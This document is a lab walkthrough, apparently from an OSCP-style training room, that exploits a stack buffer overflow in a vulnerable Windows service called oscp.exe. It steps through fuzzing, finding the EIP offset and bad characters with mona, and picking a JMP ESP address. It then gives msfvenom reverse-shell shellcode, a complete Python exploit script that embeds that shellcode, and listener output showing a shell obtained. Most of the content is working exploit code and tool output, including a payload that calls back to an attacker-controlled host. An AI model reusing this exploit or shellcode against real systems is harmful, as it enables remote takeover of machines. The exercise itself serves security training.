# Buffer Overflow (Task 8)
## Table of Contents 
* [Fuzz the App](#fuzz-the-app)
* [Find the EIP Register](#find-the-eip-register)
* [Identify Bad Characters](#identify-bad-characters)
* [Find a JMP Instruction](#find-a-jmp-instruction)
* [Generate a Payload](#generate-a-payload)
* [Send the Exploit](#send-the-exploit)
  * [Exploit](#exploit)

## Fuzz the App
```bash
USER=admin
PASS=password
TARGET=10.10.44.69
```
```bash
xfreerdp /u:$USER /p:$PASS /cert:ignore /workarea /v:$TARGET
```
```bash
cd exploits
vim fuzzer.py # update the IP variable
python fuzzer.py

# output
[*] Fuzzing: 10.10.44.69
[+] Sent: 100 bytes
[+] Sent: 200 bytes
[+] Sent: 300 bytes
[+] Sent: 400 bytes
[+] Sent: 500 bytes
[+] Sent: 600 bytes
[+] Sent: 700 bytes
[+] Sent: 800 bytes
[+] Sent: 900 bytes
[+] Sent: 1000 bytes
[+] Sent: 1100 bytes
[+] Sent: 1200 bytes
[+] Sent: 1300 bytes
[+] Sent: 1400 bytes
[+] Sent: 1500 bytes
[+] Sent: 1600 bytes
[+] Sent: 1700 bytes
[+] Sent: 1800 bytes
[!] Failed to connect.
```

## Find the EIP Register
```bash
msf-pattern_create -l 2200

# output
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2C
```

```bash
# restart the app first
vim exploit.py # PAYLOAD: (output above)
python exploit.py

# output
[*] Attacking: 10.10.44.69
[+] Sent exploit.
```

```bash
!mona findmsp -distance 2200

# output
0BADF00D   [+] Command used:
0BADF00D   !mona findmsp -distance 2200
0BADF00D   [+] Looking for cyclic pattern in memory
0BADF00D       Cyclic pattern (normal) found at 0x0193f332 (length 2200 bytes)
0BADF00D       Cyclic pattern (normal) found at 0x0086394a (length 2200 bytes)
0BADF00D       Cyclic pattern (normal) found at 0x00864d7a (length 2200 bytes)
0BADF00D   [+] Examining registers
0BADF00D       EIP contains normal pattern : 0x68433568 (offset 1786) # <-- LOOK AT THIS
0BADF00D       ESP (0x0193fa30) points at offset 1790 in normal pattern (length 410)
0BADF00D       EBP contains normal pattern : 0x43346843 (offset 1782)
0BADF00D       EBX contains normal pattern : 0x33684332 (offset 1778)
0BADF00D   [+] Examining SEH chain
0BADF00D   [+] Examining stack (+- 2200 bytes) - looking for cyclic pattern
0BADF00D       Walking stack from 0x0193f198 to 0x019402cc (0x00001134 bytes)
0BADF00D       0x0193f334 : Contains normal cyclic pattern at ESP-0x6fc (-1788) : offset 2, length 2198 (-> 0x0193fbc9 : ESP+0x19a)
0BADF00D   [+] Examining stack (+- 2200 bytes) - looking for pointers to cyclic pattern
0BADF00D       Walking stack from 0x0193f198 to 0x019402cc (0x00001134 bytes)
0BADF00D   [+] Preparing output file 'findmsp.txt'
0BADF00D       - (Re)setting logfile findmsp.txt
0BADF00D   [+] Generating module info table, hang on...
0BADF00D       - Processing modules
0BADF00D       - Done. Let's rock 'n roll.
0BADF00D
0BADF00D   [+] This mona.py action took 0:00:05.881000
```

## Identify Bad Characters
```bash
bytearray 

# output
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```

```bash
# restart the app first
vim exploit.py # OFFSET: 1786, PAYLOAD: (output above), RETN: "BBBB"
python exploit.py

# output
[*] Attacking: 10.10.44.69
[+] Sent exploit.
```

```bash
!mona config -set workingfolder c:\mona\%p

# output
0BADF00D   [+] Command used:
0BADF00D   !mona config -set workingfolder c:\mona\%p
0BADF00D   Writing value to configuration file
0BADF00D   Old value of parameter workingfolder =
0BADF00D   [+] Creating config file, setting parameter workingfolder
0BADF00D   New value of parameter workingfolder =  c:\mona\%p
0BADF00D
0BADF00D   [+] This mona.py action took 0:00:00
```

```bash
!mona bytearray -b "\x00"

# output
0BADF00D   [+] Command used:
0BADF00D   !mona bytearray -b "\x00"
0BADF00D    *** Note: parameter -b has been deprecated and replaced with -cpb ***
0BADF00D   Generating table, excluding 1 bad chars...
0BADF00D   Dumping table to file
0BADF00D   [+] Preparing output file 'bytearray.txt'
0BADF00D       - Creating working folder c:\mona\oscp
0BADF00D       - Folder created
0BADF00D       - (Re)setting logfile c:\mona\oscp\bytearray.txt
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
0BADF00D
0BADF00D   Done, wrote 255 bytes to file c:\mona\oscp\bytearray.txt
0BADF00D   Binary output saved in c:\mona\oscp\bytearray.bin
0BADF00D
0BADF00D   [+] This mona.py action took 0:00:00.016000
```

```bash
!mona compare -f C:\mona\oscp\bytearray.bin -a 018FFA30

# output
0BADF00D   [+] Command used:
0BADF00D   !mona compare -f c:\mona\oscp\bytearray.bin -a 018FFA30
0BADF00D   [+] Reading file c:\mona\oscp\bytearray.bin...
0BADF00D       Read 255 bytes from file
0BADF00D   [+] Preparing output file 'compare.txt'
0BADF00D       - (Re)setting logfile c:\mona\oscp\compare.txt
0BADF00D   [+] Generating module info table, hang on...
0BADF00D       - Processing modules
0BADF00D       - Done. Let's rock 'n roll.
0BADF00D   [+] c:\mona\oscp\bytearray.bin has been recognized as RAW bytes.
0BADF00D   [+] Fetched 255 bytes successfully from c:\mona\oscp\bytearray.bin
0BADF00D       - Comparing 1 location(s)
0BADF00D   Comparing bytes from file with memory :
018FFA30   [+] Comparing with memory at location : 0x018ffa30 (Stack)
018FFA30   Only 247 original bytes of 'normal' code found.
018FFA30       ,-----------------------------------------------.
018FFA30       | Comparison results:                           |
018FFA30       |-----------------------------------------------|
018FFA30     0 |01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f 10| File
018FFA30       |                                               | Memory
018FFA30    10 |11 12 13 14 15 16 17 18 19 1a 1b 1c 1d 1e 1f 20| File
018FFA30       |                                    0a 0d      | Memory 
018FFA30    20 |21 22 23 24 25 26 27 28 29 2a 2b 2c 2d 2e 2f 30| File   
018FFA30       |                                       0a 0d   | Memory # <-- LOOK AT THIS
018FFA30    30 |31 32 33 34 35 36 37 38 39 3a 3b 3c 3d 3e 3f 40| File
018FFA30       |                                               | Memory
018FFA30    40 |41 42 43 44 45 46 47 48 49 4a 4b 4c 4d 4e 4f 50| File
018FFA30       |                                               | Memory
018FFA30    50 |51 52 53 54 55 56 57 58 59 5a 5b 5c 5d 5e 5f 60| File
018FFA30       |                                               | Memory
018FFA30    60 |61 62 63 64 65 66 67 68 69 6a 6b 6c 6d 6e 6f 70| File
018FFA30       |                                               | Memory
018FFA30    70 |71 72 73 74 75 76 77 78 79 7a 7b 7c 7d 7e 7f 80| File
018FFA30       |                                               | Memory
018FFA30    80 |81 82 83 84 85 86 87 88 89 8a 8b 8c 8d 8e 8f 90| File
018FFA30       |                                               | Memory
018FFA30    90 |91 92 93 94 95 96 97 98 99 9a 9b 9c 9d 9e 9f a0| File
018FFA30       |                                               | Memory
018FFA30    a0 |a1 a2 a3 a4 a5 a6 a7 a8 a9 aa ab ac ad ae af b0| File
018FFA30       |                                               | Memory
018FFA30    b0 |b1 b2 b3 b4 b5 b6 b7 b8 b9 ba bb bc bd be bf c0| File
018FFA30       |                                               | Memory
018FFA30    c0 |c1 c2 c3 c4 c5 c6 c7 c8 c9 ca cb cc cd ce cf d0| File
018FFA30       |                  0a 0d                        | Memory # <-- LOOK AT THIS
018FFA30    d0 |d1 d2 d3 d4 d5 d6 d7 d8 d9 da db dc dd de df e0| File
018FFA30       |                                               | Memory
018FFA30    e0 |e1 e2 e3 e4 e5 e6 e7 e8 e9 ea eb ec ed ee ef f0| File
018FFA30       |                                       0a 0d   | Memory # <-- LOOK AT THIS
018FFA30    f0 |f1 f2 f3 f4 f5 f6 f7 f8 f9 fa fb fc fd fe ff   | File
018FFA30       |                                               | Memory
018FFA30       `-----------------------------------------------'
018FFA30
018FFA30                   | File      | Memory    | Note
018FFA30   -----------------------------------------------------
018FFA30   0   0   28  28  | 01 ... 1c | 01 ... 1c | unmodified!
018FFA30   28  28  2   2   | 1d 1e     | 0a 0d     | corrupted
018FFA30   30  30  15  15  | 1f ... 2d | 1f ... 2d | unmodified!
018FFA30   45  45  2   2   | 2e 2f     | 0a 0d     | corrupted
018FFA30   47  47  151 151 | 30 ... c6 | 30 ... c6 | unmodified!
018FFA30   198 198 2   2   | c7 c8     | 0a 0d     | corrupted
018FFA30   200 200 37  37  | c9 ... ed | c9 ... ed | unmodified!
018FFA30   237 237 2   2   | ee ef     | 0a 0d     | corrupted
018FFA30   239 239 16  16  | f0 ... ff | f0 ... ff | unmodified!
018FFA30   -----------------------------------------------------
018FFA30
018FFA30   Possibly bad chars: 1d 1e 2e 2f c7 c8 ee ef
018FFA30   Bytes omitted from input: 00
018FFA30
0BADF00D
0BADF00D   [+] This mona.py action took 0:00:00.328000
```

```bash
# repeat until Status = Unmodified: start app, exploit, generate a new byte array, compare to ESP

# ESP     , BADCHARS
# 018FFA30, "\x00\x1d\x2e\xc7\xee"

vim exploit.py # BADCHARS = "\x00\x1d\x2e\xc7\xee"
python exploit.py

# output
[*] Attacking: 10.10.44.69
[+] Sent exploit.
```

```bash
!mona compare -f c:\mona\oscp\bytearray.bin -a 0185FA30

# output
Log data
Address    Message
0BADF00D   [+] Command used:
0BADF00D   !mona compare -f c:\mona\oscp\bytearray.bin -a 0185FA30
0BADF00D   [+] Reading file c:\mona\oscp\bytearray.bin...
0BADF00D       Read 251 bytes from file
0BADF00D   [+] Preparing output file 'compare.txt'
0BADF00D       - (Re)setting logfile c:\mona\oscp\compare.txt
0BADF00D   [+] Generating module info table, hang on...
0BADF00D       - Processing modules
0BADF00D       - Done. Let's rock 'n roll.
0BADF00D   [+] c:\mona\oscp\bytearray.bin has been recognized as RAW bytes.
0BADF00D   [+] Fetched 251 bytes successfully from c:\mona\oscp\bytearray.bin
0BADF00D       - Comparing 1 location(s)
0BADF00D   Comparing bytes from file with memory :
0185FA30   [+] Comparing with memory at location : 0x0185fa30 (Stack)
0185FA30   !!! Hooray, normal shellcode unmodified !!!                # <--- GOOD!
0185FA30   Bytes omitted from input: 00 1d 2e c7 ee
0BADF00D
0BADF00D   [+] This mona.py action took 0:00:00.312000
```

## Find a JMP Instruction
```bash
!mona jmp -r esp -cpb "\x00\x1d\x2e\xc7\xee"

# output
Log data
Address    Message
0BADF00D   [+] Command used:
0BADF00D   !mona jmp -r esp -cpb "\x00\x1d\x2e\xc7\xee"

           ---------- Mona command started on 2021-08-28 19:57:29 (v2.0, rev 605) ----------
0BADF00D   [+] Processing arguments and criteria
0BADF00D       - Pointer access level : X
0BADF00D       - Bad char filter will be applied to pointers : "\x00\x1d\x2e\xc7\xee"
0BADF00D   [+] Generating module info table, hang on...
0BADF00D       - Processing modules
0BADF00D       - Done. Let's rock 'n roll.
0BADF00D   [+] Querying 2 modules
0BADF00D       - Querying module essfunc.dll
75150000   Modules C:\Windows\System32\wshtcpip.dll
0BADF00D       - Querying module oscp.exe
0BADF00D       - Search complete, processing results
0BADF00D   [+] Preparing output file 'jmp.txt'
0BADF00D       - (Re)setting logfile c:\mona\oscp\jmp.txt
0BADF00D   [+] Writing results to c:\mona\oscp\jmp.txt
0BADF00D       - Number of pointers of type 'jmp esp' : 8
0BADF00D   [+] Results :
625011AF     0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False... # <-- USING THIS ONE
# ...snipped...
0BADF00D       Found a total of 8 pointers
0BADF00D
0BADF00D   [+] This mona.py action took 0:00:00.312000
```

```bash
# ADDRESS: "\x62\x50\x11\xaf" # address of JMP instruction
# RETN: "\xaf\x11\x50\x62" # address of JMP instrucion, in Little Endian
```

## Generate a Payload

USE YOUR IP ADDRESS FOR THE LHOST!
```bash
ip address
LHOST=10.8.224.177 # change me
BADCHARS="\x00\x1d\x2e\xc7\xee" # change me
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f python -v PAYLOAD EXITFUNC=thread -b $BADCHARS

# output
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1869 bytes
PAYLOAD =  b""
PAYLOAD += b"\xdd\xc3\xbe\xc0\x6e\xfe\xd9\xd9\x74\x24\xf4\x5b"
PAYLOAD += b"\x33\xc9\xb1\x52\x31\x73\x17\x03\x73\x17\x83\x2b"
PAYLOAD += b"\x92\x1c\x2c\x57\x83\x63\xcf\xa7\x54\x04\x59\x42"
PAYLOAD += b"\x65\x04\x3d\x07\xd6\xb4\x35\x45\xdb\x3f\x1b\x7d"
PAYLOAD += b"\x68\x4d\xb4\x72\xd9\xf8\xe2\xbd\xda\x51\xd6\xdc"
PAYLOAD += b"\x58\xa8\x0b\x3e\x60\x63\x5e\x3f\xa5\x9e\x93\x6d"
PAYLOAD += b"\x7e\xd4\x06\x81\x0b\xa0\x9a\x2a\x47\x24\x9b\xcf"
PAYLOAD += b"\x10\x47\x8a\x5e\x2a\x1e\x0c\x61\xff\x2a\x05\x79"
PAYLOAD += b"\x1c\x16\xdf\xf2\xd6\xec\xde\xd2\x26\x0c\x4c\x1b"
PAYLOAD += b"\x87\xff\x8c\x5c\x20\xe0\xfa\x94\x52\x9d\xfc\x63"
PAYLOAD += b"\x28\x79\x88\x77\x8a\x0a\x2a\x53\x2a\xde\xad\x10"
PAYLOAD += b"\x20\xab\xba\x7e\x25\x2a\x6e\xf5\x51\xa7\x91\xd9"
PAYLOAD += b"\xd3\xf3\xb5\xfd\xb8\xa0\xd4\xa4\x64\x06\xe8\xb6"
PAYLOAD += b"\xc6\xf7\x4c\xbd\xeb\xec\xfc\x9c\x63\xc0\xcc\x1e"
PAYLOAD += b"\x74\x4e\x46\x6d\x46\xd1\xfc\xf9\xea\x9a\xda\xfe"
PAYLOAD += b"\x0d\xb1\x9b\x90\xf3\x3a\xdc\xb9\x37\x6e\x8c\xd1"
PAYLOAD += b"\x9e\x0f\x47\x21\x1e\xda\xc8\x71\xb0\xb5\xa8\x21"
PAYLOAD += b"\x70\x66\x41\x2b\x7f\x59\x71\x54\x55\xf2\x18\xaf"
PAYLOAD += b"\x3e\xf7\xd4\x4f\x0f\x6f\xe7\x8f\x71\xcb\x6e\x69"
PAYLOAD += b"\x1b\x3b\x27\x22\xb4\xa2\x62\xb8\x25\x2a\xb9\xc5"
PAYLOAD += b"\x66\xa0\x4e\x3a\x28\x41\x3a\x28\xdd\xa1\x71\x12"
PAYLOAD += b"\x48\xbd\xaf\x3a\x16\x2c\x34\xba\x51\x4d\xe3\xed"
PAYLOAD += b"\x36\xa3\xfa\x7b\xab\x9a\x54\x99\x36\x7a\x9e\x19"
PAYLOAD += b"\xed\xbf\x21\xa0\x60\xfb\x05\xb2\xbc\x04\x02\xe6"
PAYLOAD += b"\x10\x53\xdc\x50\xd7\x0d\xae\x0a\x81\xe2\x78\xda"
PAYLOAD += b"\x54\xc9\xba\x9c\x58\x04\x4d\x40\xe8\xf1\x08\x7f"
PAYLOAD += b"\xc5\x95\x9c\xf8\x3b\x06\x62\xd3\xff\x26\x81\xf1"
PAYLOAD += b"\xf5\xce\x1c\x90\xb7\x92\x9e\x4f\xfb\xaa\x1c\x65"
PAYLOAD += b"\x84\x48\x3c\x0c\x81\x15\xfa\xfd\xfb\x06\x6f\x01"
PAYLOAD += b"\xaf\x27\xba"
```

## Send the Exploit
```bash
# restart the app first
vim exploit.py # RETN: (address of JMP instruction found), PAYLOAD: (output above), PADDING: "\x90" * 16
python exploit.py

# output
[*] Attacking: 10.10.44.69
[+] Sent exploit.
```

```bash
sudo nc -nvlp 443

# output
listening on [any] 443 ...
connect to [10.8.224.177] from (UNKNOWN) [10.10.44.69] 49220
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\admin\Desktop\vulnerable-apps\oscp>
```

## Exploit
```python
#!/usr/bin/env python3

import socket

IP = "10.10.44.69" # change me
PORT = 1337 # change me
TARGET = (IP,PORT)
PREFIX = "OVERFLOW8 " # change me; vulnerable function of target
OFFSET = 1786 # change me; fuzz the target to determine the correct value
OVERFLOW = "A" * OFFSET # bogus chars that will preceed the 
RETN = "\xaf\x11\x50\x62" # address of a JMP instruction, in Little Endian
PADDING = "\x90" * 16 # so the msfvenom encoder does not overwrite itself
BADCHARS = "\x00\x1d\x2e\xc7\xee" # exclude these from your shellcode
PAYLOAD =  b""
PAYLOAD += b"\xdd\xc3\xbe\xc0\x6e\xfe\xd9\xd9\x74\x24\xf4\x5b"
PAYLOAD += b"\x33\xc9\xb1\x52\x31\x73\x17\x03\x73\x17\x83\x2b"
PAYLOAD += b"\x92\x1c\x2c\x57\x83\x63\xcf\xa7\x54\x04\x59\x42"
PAYLOAD += b"\x65\x04\x3d\x07\xd6\xb4\x35\x45\xdb\x3f\x1b\x7d"
PAYLOAD += b"\x68\x4d\xb4\x72\xd9\xf8\xe2\xbd\xda\x51\xd6\xdc"
PAYLOAD += b"\x58\xa8\x0b\x3e\x60\x63\x5e\x3f\xa5\x9e\x93\x6d"
PAYLOAD += b"\x7e\xd4\x06\x81\x0b\xa0\x9a\x2a\x47\x24\x9b\xcf"
PAYLOAD += b"\x10\x47\x8a\x5e\x2a\x1e\x0c\x61\xff\x2a\x05\x79"
PAYLOAD += b"\x1c\x16\xdf\xf2\xd6\xec\xde\xd2\x26\x0c\x4c\x1b"
PAYLOAD += b"\x87\xff\x8c\x5c\x20\xe0\xfa\x94\x52\x9d\xfc\x63"
PAYLOAD += b"\x28\x79\x88\x77\x8a\x0a\x2a\x53\x2a\xde\xad\x10"
PAYLOAD += b"\x20\xab\xba\x7e\x25\x2a\x6e\xf5\x51\xa7\x91\xd9"
PAYLOAD += b"\xd3\xf3\xb5\xfd\xb8\xa0\xd4\xa4\x64\x06\xe8\xb6"
PAYLOAD += b"\xc6\xf7\x4c\xbd\xeb\xec\xfc\x9c\x63\xc0\xcc\x1e"
PAYLOAD += b"\x74\x4e\x46\x6d\x46\xd1\xfc\xf9\xea\x9a\xda\xfe"
PAYLOAD += b"\x0d\xb1\x9b\x90\xf3\x3a\xdc\xb9\x37\x6e\x8c\xd1"
PAYLOAD += b"\x9e\x0f\x47\x21\x1e\xda\xc8\x71\xb0\xb5\xa8\x21"
PAYLOAD += b"\x70\x66\x41\x2b\x7f\x59\x71\x54\x55\xf2\x18\xaf"
PAYLOAD += b"\x3e\xf7\xd4\x4f\x0f\x6f\xe7\x8f\x71\xcb\x6e\x69"
PAYLOAD += b"\x1b\x3b\x27\x22\xb4\xa2\x62\xb8\x25\x2a\xb9\xc5"
PAYLOAD += b"\x66\xa0\x4e\x3a\x28\x41\x3a\x28\xdd\xa1\x71\x12"
PAYLOAD += b"\x48\xbd\xaf\x3a\x16\x2c\x34\xba\x51\x4d\xe3\xed"
PAYLOAD += b"\x36\xa3\xfa\x7b\xab\x9a\x54\x99\x36\x7a\x9e\x19"
PAYLOAD += b"\xed\xbf\x21\xa0\x60\xfb\x05\xb2\xbc\x04\x02\xe6"
PAYLOAD += b"\x10\x53\xdc\x50\xd7\x0d\xae\x0a\x81\xe2\x78\xda"
PAYLOAD += b"\x54\xc9\xba\x9c\x58\x04\x4d\x40\xe8\xf1\x08\x7f"
PAYLOAD += b"\xc5\x95\x9c\xf8\x3b\x06\x62\xd3\xff\x26\x81\xf1"
PAYLOAD += b"\xf5\xce\x1c\x90\xb7\x92\x9e\x4f\xfb\xaa\x1c\x65"
PAYLOAD += b"\x84\x48\x3c\x0c\x81\x15\xfa\xfd\xfb\x06\x6f\x01"
PAYLOAD += b"\xaf\x27\xba"
SUFFIX = "" 
EXPLOIT = PREFIX + OVERFLOW + RETN + PADDING + PAYLOAD + SUFFIX

print("[*] Attacking: %s" % IP)
try:
    CLIENT = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    CLIENT.settimeout(3)
    CLIENT.connect(TARGET)
    CLIENT.send(EXPLOIT)
    CLIENT.recv(1024)
    CLIENT.close()
    print("[+] Sent exploit.")
except socket.error as ERROR:
    print("[!] Failed to connect.")
    exit()
```
